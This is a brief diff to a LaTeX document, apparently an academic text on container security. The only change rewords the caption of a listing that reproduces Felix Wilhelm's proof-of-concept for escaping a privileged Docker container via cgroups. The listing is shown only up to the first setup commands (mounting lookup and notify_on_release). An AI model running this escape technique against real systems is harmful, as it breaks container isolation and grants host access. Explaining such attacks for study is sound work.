@@ -9,7 +9,7 @@ A simple example of this, is using a feature in \lstinline{cgroups}\cite{CGroup-
 \hfill
 
 We can look at a proof of concept of this attack developed by security researcher Felix Wilhelm\cite{Felix-Wilhem-Tweet}.
-\begin{lstlisting}[caption={Docker escape using \lstinline{cgroups} (privileged)},captionpos=b]
+\begin{lstlisting}[caption={Privileged container escape using \lstinline{cgroups}.},captionpos=b]
 (host)$ docker run -it --rm --privileged ubuntu:latest bash
 (cont)# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 (cont)# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
